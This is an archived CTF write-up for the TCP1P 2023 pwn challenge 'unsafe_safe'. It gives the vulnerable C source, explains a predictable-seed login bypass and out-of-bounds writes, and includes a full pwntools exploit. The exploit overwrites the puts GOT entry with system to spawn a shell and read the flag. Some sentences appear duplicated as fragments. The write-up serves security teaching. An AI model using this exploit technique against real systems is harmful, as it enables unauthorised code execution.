# unsafe_safe

**CTF:** TCP1P 2023  
**Category:** pwn  
**Original writeup:** <https://chovid99.github.io/posts/tcp1p-ctf-2023/> — by **chovid99**. All credit goes to the original author; this is an archived copy.

---

unsafe safe

Description Author: zran So I just turned 17 and decided to make a bank account to deposit my money. This bank stores the money is safes, so it should be safe right? nc ctf.tcp1p.com 1477

Solution

In this challenge, we are provided with a source code unsafe.c , along with its binary and the used libc. First, we check the mitigations applied to the binary with checksec .

1 2 3 4 5 6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: '.'

Partial RELRO means we can overwrite the GOT . Now, let’s look at the provided source code:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <time.h> unsigned long safes [ 100 ] = { 7955998170729676800 }; char * exit_message = "Have a nice day!" ; void init () { setvbuf ( stdin , NULL , _IONBF , 0 ); setvbuf ( stdout , NULL , _IONBF , 0 ); setvbuf ( stderr , NULL , _IONBF , 0 ); } void deposit () { int index = 0 ; int amount = 0 ; puts ( "Enter the safe number you want to deposit in (0-100): " ); scanf ( "%d" , & index ); puts ( "Enter the amount you want to deposit: " ); scanf ( "%d" , & amount ); safes [ index ] += amount ; } void login () { unsigned long age , input , password ; char pet_name [ 5 ] = " \0\0\0\0\0 " ; puts ( "Input your age: " ); scanf ( "%lu" , & age ); if ( age < 17 ) { puts ( "Sorry, this is not a place for kids" ); exit ( 0 ); } puts ( "Input your pet name: " ); scanf ( "%5c" , pet_name ); srand ( time ( NULL ) * ( * ( short * ) pet_name * * ( short * )( pet_name + 2 ) + age )); password = rand (); puts ( "Input your password: " ); scanf ( "%lu" , & input ); if ( input != password ) { puts ( "Password Wrong!" ); exit ( 0 ); } } int main () { init (); login (); deposit (); deposit (); deposit (); puts ( exit_message ); }

Looking at the code above, we can identify two bugs:

In the login function, the seed used by srand involves the current time along with the pet_name and age variables, which we can control. Therefore, the seed is predictable, and we can easily determine the password value filled in by the rand() result. Thus, we can ensure that we will successfully login and proceed to the next function.

function, the seed used by involves the current time along with the and variables, which we can control. Therefore, the is predictable, and we can easily determine the value filled in by the result. In the deposit function, there’s no validation for the index value we input. This results in an Out-of-Bound Write (OOB) relative to the position of the safes array in the line of code safes[index] += amount . Note that the safes array is a global variable, so its position will be in the bss segment.

function, there’s no validation for the value we input.

We are given three OOB writes before the program calls puts(exit_message) . Based on the above information, with these three OOB writes, one scenario we can do is:

With the first write, we can store the string /bin/sh in the safes array. Notice in the code above that safes has an initial value of 7955998170729676800 (a numeral representation of \x00\x00\x00\x00/bin ), which means safes+4 is /bin . We only need to write /sh to safes[1] ( safes+8 ), making the address safes+4 the string /bin/sh .

in the array. Note that exit_message is a pointer to char. With the second OOB write, we can change its stored value so that its address becomes the address of safes+4 . This change will make exit_message the string /bin/sh .

is a pointer to char. With the second OOB write, we can change its stored value so that its address becomes the address of . Lastly, because of Partial RELRO , we can overwrite the GOT value of puts with the address of system , so when we call puts , what gets invoked is system .

If we execute the above scenario, when the program calls puts(exit_message) , it will execute system("/bin/sh") .

Here is the solver script we used:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 from pwn import * from ctypes import CDLL from ctypes.util import find_library libc_dll = CDLL ( find_library ( "c" )) exe = ELF ( "unsafe_patched" ) libc = ELF ( "./libc.so.6" ) ld = ELF ( "./ld-linux-x86-64.so.2" ) context . binary = exe context . arch = 'amd64' context . encoding = 'latin' context . log_level = 'INFO' warnings . simplefilter ( "ignore" ) remote_url = "ctf.tcp1p.com" remote_port = 1477 gdbscript = ''' ''' def conn (): if args . LOCAL : r = process ([ exe . path ]) if args . PLT_DEBUG : # gdb.attach(r, gdbscript=gdbscript) pause () else : r = remote ( remote_url , remote_port ) return r def demangle ( val , is_heap_base = False ): if not is_heap_base : mask = 0xfff << 52 while mask : v = val & mask val ^= ( v >> 12 ) mask >>= 12 return val return val << 12 def mangle ( heap_addr , val ): return ( heap_addr >> 12 ) ^ val r = conn () # Login r . sendlineafter ( b 'age:

' , b '17' ) r . sendafter ( b 'name:

' , b ' \x00 ' * 4 ) ts = libc_dll . time ( 0 ) seed = ( ts * 17 ) % 2 ** 32 libc_dll . srand ( seed ) password = libc_dll . rand () info ( f ' { password = } ' ) r . sendlineafter ( b 'password: ' , str ( password ) . encode ()) # Write /sh r . sendlineafter ( b '(0-100): ' , str ( 1 ) . encode ()) r . sendlineafter ( b 'deposit: ' , str ( 0x68732f ) . encode ()) # Ovewrite exit_message to safes+4 r . sendlineafter ( b '(0-100): ' , str ( 100 ) . encode ()) r . sendlineafter ( b 'deposit: ' , str ( 0x205c ) . encode ()) # Value is retrieved based on observation in GDB # Overwrite puts with system r . sendlineafter ( b '(0-100): ' , str ( - 12 ) . encode ()) r . sendlineafter ( b 'deposit: ' , str ( libc . sym . system - libc . sym . puts ) . encode ()) r . interactive ()

Jalankan script, dan kita pun mendapatkan shell.

1 2 3 4 5 6 [+] Opening connection to ctf.tcp1p.com on port 1477: Done [*] password = 75291657 [*] Switching to interactive mode $ cat flag.txt TCP1P{bYp45s_tH3_l091n_4nd_0v3rwR1te_pUt5_t0_sy5t3m_4Nd_g3t_5hELl}

Flag: TCP1P{bYp45s_tH3_l091n_4nd_0v3rwR1te_pUt5_t0_sy5t3m_4Nd_g3t_5hELl}
